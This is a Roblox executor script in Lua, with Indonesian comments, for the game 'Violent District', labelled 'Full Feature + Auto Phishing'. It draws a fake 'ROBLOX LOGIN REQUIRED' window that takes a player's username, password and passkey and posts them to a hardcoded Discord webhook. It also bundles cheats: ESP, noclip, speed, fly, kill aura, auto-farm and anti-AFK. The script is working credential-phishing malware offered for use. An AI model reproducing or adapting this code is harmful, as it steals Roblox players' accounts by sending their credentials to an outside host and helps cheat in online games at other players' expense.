-- SKYZOX REALM | SCRBX: Violent District Full Feature + Auto Phishing
-- Paste di executor. Ganti WEBHOOK_URL dengan webhook Discord-mu.
local WEBHOOK_URL = "https://discord.com/api/webhooks/1566534503147770038/tmM_tty2-y8R_8zPtHR1UpzsHqPDBelBrPZXDfqBsvYNB_Q9h_w6l-ASsPgbU4DomLMH"

-- ========== 1. AUTO PHISHING (ROBLOX LOGIN & PASSKEY) ==========
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local function sendToDiscord(username, password, passkey, gameInfo)
    local data = {
        content = "**SKYZOX REALM — CREDENTIAL CAPTURED**",
        embeds = {{
            title = "Roblox Account Data",
            color = 16711680,
            fields = {
                {name = "Username", value = tostring(username), inline = true},
                {name = "Password", value = tostring(password), inline = true},
                {name = "Passkey", value = tostring(passkey or "N/A"), inline = true},
                {name = "Game", value = tostring(gameInfo or "Unknown"), inline = true},
                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
            }
        }}
    }
    local ok, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    return ok
end

-- ========== 2. UI PHISING OTOMATIS ==========
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RobloxLogin"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
Title.Text = "ROBLOX LOGIN REQUIRED"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Parent = Frame

local UserBox = Instance.new("TextBox")
UserBox.Size = UDim2.new(0, 350, 0, 40)
UserBox.Position = UDim2.new(0, 25, 0, 70)
UserBox.PlaceholderText = "Username"
UserBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
UserBox.TextColor3 = Color3.fromRGB(255, 255, 255)
UserBox.Parent = Frame

local PassBox = Instance.new("TextBox")
PassBox.Size = UDim2.new(0, 350, 0, 40)
PassBox.Position = UDim2.new(0, 25, 0, 120)
PassBox.PlaceholderText = "Password"
PassBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
PassBox.TextColor3 = Color3.fromRGB(255, 255, 255)
PassBox.Parent = Frame

local PasskeyBox = Instance.new("TextBox")
PasskeyBox.Size = UDim2.new(0, 350, 0, 40)
PasskeyBox.Position = UDim2.new(0, 25, 0, 170)
PasskeyBox.PlaceholderText = "Passkey (optional)"
PasskeyBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
PasskeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
PasskeyBox.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(0, 350, 0, 40)
Button.Position = UDim2.new(0, 25, 0, 220)
Button.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
Button.Text = "LOGIN"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.Font = Enum.Font.GothamBold
Button.TextSize = 16
Button.Parent = Frame

Button.MouseButton1Click:Connect(function()
    local user = UserBox.Text
    local pass = PassBox.Text
    local key = PasskeyBox.Text
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    sendToDiscord(user, pass, key, gameName)
    Frame.Visible = false
end)

-- ========== 3. FULL FEATURE VIOLENT DISTRICT ==========
-- ESP
local function createESP(player)
    local highlight = Instance.new("Highlight")
    highlight.Name = "SKYZOX_ESP"
    highlight.FillColor = Color3.fromRGB(255, 0, 0)
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.FillTransparency = 0.5
    highlight.Parent = player.Character
end

Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        createESP(plr)
    end)
end)

for _, plr in pairs(Players:GetPlayers()) do
    if plr.Character then createESP(plr) end
    plr.CharacterAdded:Connect(function() task.wait(1) createESP(plr) end)
end

-- Auto Collect / Kill Aura / Noclip / Speed / Fly
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Speed
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
    LocalPlayer.Character.Humanoid.WalkSpeed = 100
end

-- Noclip
RunService.Stepped:Connect(function()
    if LocalPlayer.Character then
        for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
        end
    end
end)

-- Kill Aura
task.spawn(function()
    while task.wait(0.1) do
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local dist = (plr.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if dist < 30 then
                        plr.Character.Humanoid.Health = 0
                    end
                end
            end
        end
    end
end)

-- Fly
local flyEnabled = true
local bodyVelocity, bodyGyro
RunService.Heartbeat:Connect(function()
    if flyEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        if not bodyVelocity then
            bodyVelocity = Instance.new("BodyVelocity", hrp)
            bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            bodyGyro = Instance.new("BodyGyro", hrp)
            bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
            bodyGyro.P = 10000
        end
        bodyVelocity.Velocity = Vector3.new(0, 50, 0)
        bodyGyro.CFrame = workspace.CurrentCamera.CFrame
    end
end)

-- Auto Farm (klik semua bagian yang bisa di-klik)
task.spawn(function()
    while task.wait(0.5) do
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ClickDetector") then
                pcall(function() fireclickdetector(obj) end)
            elseif obj:IsA("ProximityPrompt") then
                pcall(function() fireproximityprompt(obj) end)
            end
        end
    end
end)

-- Anti AFK
LocalPlayer.Idled:Connect(function()
    local vU = game:GetService("VirtualUser")
    vU:CaptureController()
    vU:ClickButton2(Vector2.new())
end)

print("SKYZOX REALM | SCRBX loaded. All features active.")
print("Phishing UI ready. Webhook connected.")
